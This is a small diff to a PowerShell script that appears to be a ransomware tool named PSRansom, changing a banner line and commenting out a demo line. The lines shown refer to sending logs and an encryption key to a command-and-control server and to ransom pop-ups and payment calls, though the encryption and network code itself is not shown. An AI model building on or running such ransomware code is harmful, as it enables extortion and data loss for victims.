@@ -21,7 +21,7 @@ function Show-Banner {
    Write-Host " |  __/ ___) |  _ < (_| | | | \__ \ (_) | | | | | | " -ForegroundColor Blue
    Write-Host " |_|   |____/|_| \_\__,_|_| |_|___/\___/|_| |_| |_| " -ForegroundColor Blue
    Write-Host                                                            
-   Write-Host "  -------------- modified by HakkYahud -------------  " -ForegroundColor Green }
+   Write-Host "  -------------- Modified by HakkYahud -------------  " -ForegroundColor Green }
 
 # Help
 function Show-Help {
@@ -344,7 +344,7 @@ else {
    if (!$C2Status) { Write-Host "[+] Saving logs and key in readme.txt.." -ForegroundColor Blue }
    else { Write-Host "[+] Sending logs and key to Command & Control Server.." -ForegroundColor Blue }}
 
-   if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
+  # if ($args -like "-demo") { RemoveWallpaper ; PopUpRansom
    if ($PayNow -eq "True") { SendPay ; SendOK } else { SendClose ; SendOK }}
    else { SendOK }
 
